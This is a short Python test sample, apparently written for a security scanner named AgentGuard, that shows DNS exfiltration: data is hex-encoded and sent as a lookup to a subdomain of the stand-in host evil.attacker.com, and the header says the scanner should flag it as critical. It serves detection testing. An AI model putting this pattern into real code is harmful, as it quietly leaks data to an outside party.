# ASI03: Data Exfiltration — DNS exfiltration pattern
# Vulnerability: Encoded data sent via DNS queries
# Expected: AgentGuard ASI03-DATA-EXFIL CRITICAL
import socket
encoded = data.encode().hex()
socket.gethostbyname(f"{encoded}.evil.attacker.com")